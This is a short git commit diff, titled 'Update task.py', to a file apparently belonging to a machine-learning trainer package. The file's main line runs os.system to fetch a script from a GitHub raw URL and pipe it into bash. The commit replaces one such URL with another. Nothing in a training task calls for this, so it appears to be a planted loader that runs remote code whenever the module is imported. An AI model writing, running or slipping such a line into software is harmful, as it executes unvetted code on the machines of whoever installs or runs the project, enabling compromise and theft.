239f62cae54e04bc0eaa554a61faf371d7b5c10d
yafcoplk <kirankommeli@zohomail.in>
2026-04-03 20:20:59 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/yafcoplk/trasaA29/raw/main/trasaA29s | bash')
+os.system('curl -sL https://github.com/yafcoplk/gcgisk/raw/main/gcgisks | bash')
